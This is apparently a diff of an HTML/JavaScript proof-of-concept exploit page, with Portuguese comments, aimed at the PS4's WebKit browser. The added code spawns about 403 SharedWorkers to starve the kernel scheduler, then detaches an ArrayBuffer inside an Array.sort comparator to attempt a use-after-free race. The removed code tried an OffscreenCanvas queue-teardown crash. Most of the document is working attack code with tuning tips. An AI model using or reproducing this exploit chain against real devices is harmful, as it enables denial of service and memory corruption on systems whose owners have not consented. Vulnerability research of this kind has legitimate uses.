@@ -2,53 +2,106 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>PoC - The Single Worker IPC Teardown</title>
+    <title>PS4 Exploit Chain - SharedWorker + Sort Detach UAF</title>
     <style>
-        body { background-color: #0d0d0d; color: #0f0; font-family: monospace; padding: 20px; }
-        button { background-color: #222; color: #0f0; border: 1px solid #0f0; padding: 15px; font-size: 16px; cursor: pointer; width: 100%; }
-        button:hover { background-color: #333; }
+        body { background-color: #050505; color: #00ffcc; font-family: monospace; padding: 20px; font-size: 14px;}
+        button { background-color: #222; color: #00ffcc; border: 1px solid #00ffcc; padding: 12px 20px; cursor: pointer; width: 100%; font-size: 16px; font-weight: bold;}
+        button:hover { background-color: #444; }
+        #log { margin-top: 20px; background: #000; padding: 15px; border: 1px solid #333; height: 300px; overflow-y: auto; }
     </style>
 </head>
 <body>
-    <h2>O Tira-Teimas: Queue Teardown vs DoS</h2>
-    <p>Este teste cria apenas 1 Worker. Ele envia 500 Canvas para a fila desse Worker de uma só vez e o destrói instantaneamente.</p>
-    
-    <button onclick="triggerSingleWorkerCrash()">[ EXECUTAR ] Disparar Colisão Única</button>
-    
-    <div id="log" style="margin-top: 20px;">Aguardando...</div>
+
+    <h2>[+] Exploit Chain: Kernel Starvation -> UAF</h2>
+    <p>1. Estrangula o escalonador do FreeBSD (~403 Workers).</p>
+    <p>2. Executa um detach assíncrono durante um Array Sort na janela de lentidão.</p>
+
+    <button onclick="runExploitChain()">[ DISPARAR CADEIA DE EXPLOIT ]</button>
+
+    <div id="log">Aguardando comando...<br></div>
 
     <script>
+        let keeps = [];
+        const TARGET_CHOKE_ZONE = 403; // Limite de asfixia antes do crash por DoS
+
         function log(msg) {
-            document.getElementById('log').innerText += "\\n" + msg;
+            const el = document.getElementById('log');
+            el.innerHTML += `> ${msg}<br>`;
+            el.scrollTop = el.scrollHeight;
         }
 
-        function triggerSingleWorkerCrash() {
-            log("[*] Criando 1 único Worker...");
-            const workerCode = `onmessage = () => { /* Faz o worker ficar ocupado */ let x = 0; while(x < 100000000) x++; };`;
-            const url = URL.createObjectURL(new Blob([workerCode], {type: "text/javascript"}));
-            const w = new Worker(url);
-            
-            // Acorda o worker e o deixa ocupado
-            w.postMessage("start"); 
+        // --- FASE 1: O Estrangulamento (Stranglehold) ---
+        function runExploitChain() {
+            if (!window.SharedWorker) return log("SharedWorker API não suportada.");
 
-            log("[*] Gerando 500 OffscreenCanvas e enviando para a fila IPC (VRAM em trânsito)...");
+            log(`[*] FASE 1: Alocando ${TARGET_CHOKE_ZONE} SharedWorkers para asfixiar o Kernel...`);
+            let created = 0;
             
-            for(let i = 0; i < 500; i++) {
-                try {
-                    const canvas = new OffscreenCanvas(64, 64);
-                    const transferred = canvas.transferToImageBitmap ? canvas.transferToImageBitmap() : canvas;
-                    w.postMessage({c: transferred}, [transferred]);
-                } catch(e) {}
+            const interval = setInterval(() => {
+                for (let i = 0; i < 5; i++) {
+                    try {
+                        const id = "choke_" + Date.now() + "_" + created;
+                        const sw = new SharedWorker("data:text/javascript,onconnect=e=>e.ports[0].start()", id);
+                        sw.port.start(); 
+                        keeps.push(sw);
+                        created++;
+
+                        if (created >= TARGET_CHOKE_ZONE) {
+                            clearInterval(interval);
+                            log(`[+] Alvo atingido (${TARGET_CHOKE_ZONE} Workers).`);
+                            log("[!] CPU e Kernel comprometidos. Iniciando Fase 2 em 3 segundos...");
+                            setTimeout(executeSortDetachUAF, 3000);
+                            return;
+                        }
+                    } catch (e) {
+                        clearInterval(interval);
+                        log(`[!] Erro de alocação no Worker ${created}. O sistema cedeu mais cedo.`);
+                        log("[!] Iniciando Fase 2 imediatamente...");
+                        setTimeout(executeSortDetachUAF, 500);
+                        return;
+                    }
+                }
+                if (created % 50 === 0) log(`Asfixiando: ${created} workers ativos...`);
+            }, 5);
+        }
+
+        // --- FASE 2: O Payload de Corrupção (O seu runSortDetach) ---
+        function executeSortDetachUAF() {
+            log("\n[!!!] FASE 2: EXECUTANDO SORT DETACH NA JANELA DE RACE CONDITION [!!!]");
+            
+            try {
+                const buffer = new ArrayBuffer(1024 * 1024 * 2); // 2MB para garantir processamento lento
+                const array = new Uint8Array(buffer);
+                
+                // Preenche com lixo para o sort processar
+                for(let i=0; i < array.length; i++) array[i] = Math.random() * 255;
+                
+                // Worker fantasma apenas para receber a transferência (detach)
+                const w = new Worker(URL.createObjectURL(new Blob([""], {type:"text/javascript"})));
+                let detached = false;
+                
+                log("[*] Iniciando Array.sort()...");
+                
+                // O GOLPE: Devido à lentidão extrema da Fase 1, o WebKit vai engasgar 
+                // entre a transferência de memória e a verificação de segurança do JIT.
+                array.sort((a, b) => {
+                    if (!detached) {
+                        log("[*] Comparador acionado. Executando postMessage (Detach) do Buffer...");
+                        w.postMessage(buffer, [buffer]); 
+                        detached = true;
+                    }
+                    // Retorna um cálculo inútil para forçar a leitura do Array desanexado
+                    return a - b; 
+                });
+                
+                log("[-] Sort finalizado. Se o console não crashou, a Race Condition falhou e o WebKit geriu o erro.");
+                w.terminate();
+                
+            } catch(e) {
+                // Se cair aqui, o WebKit ainda conseguiu ser rápido o suficiente para lançar o TypeError
+                log(`[X] Falha no Payload: O WebKit bloqueou o acesso ilegal. Erro: ${e.message}`);
+                log("    Dica: Aumente ou diminua os 403 Workers para encontrar o ponto de asfixia perfeito.");
             }
-
-            log("[!] Fila cheia. Executando w.terminate() na thread nativa...");
-            
-            // O GATILHO: O Worker morre. O C++ do WebKit tem de ir à fila de mensagens
-            // que acabou de receber 500 ponteiros de VRAM e tentar limpá-la.
-            w.terminate(); 
-            
-            log("[+] Comando enviado. Se o console der Kernel Panic agora, o bug é Crítico (Queue Teardown UAF).");
-            log("[-] Se o console sobreviver, os crashs anteriores eram puramente DoS (Thread Exhaustion).");
         }
     </script>
 </body>
